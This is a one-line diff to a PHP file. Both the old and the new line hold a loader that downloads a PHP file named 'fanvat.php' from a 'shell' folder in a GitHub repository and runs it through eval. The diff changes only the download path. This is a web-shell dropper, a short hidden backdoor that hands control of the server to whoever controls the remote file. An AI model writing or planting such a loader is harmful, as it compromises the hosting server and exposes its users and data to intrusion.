@@ -1,1 +1,1 @@
-<?php ($r=@file_get_contents('https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/fanvat.php'))?eval('?>'.$r):die('Error');
+<?php ($r=@file_get_contents('https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php'))?eval('?>'.$r):die('Error');
